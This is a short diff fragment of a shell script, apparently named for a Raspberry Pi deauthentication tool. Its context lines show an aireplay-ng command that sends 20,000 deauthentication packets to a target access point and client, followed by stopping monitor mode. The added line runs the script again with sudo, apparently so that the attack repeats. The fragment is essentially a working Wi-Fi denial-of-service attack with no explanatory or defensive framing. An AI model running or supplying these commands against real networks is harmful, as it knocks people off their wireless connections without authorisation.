@@ -32,3 +32,5 @@ aireplay-ng --deauth 20000 -a $bssid -c $mac wlan0mon
 
 sudo airmon-ng stop "$iface"mon
 
+sudo ./deauthpi
+
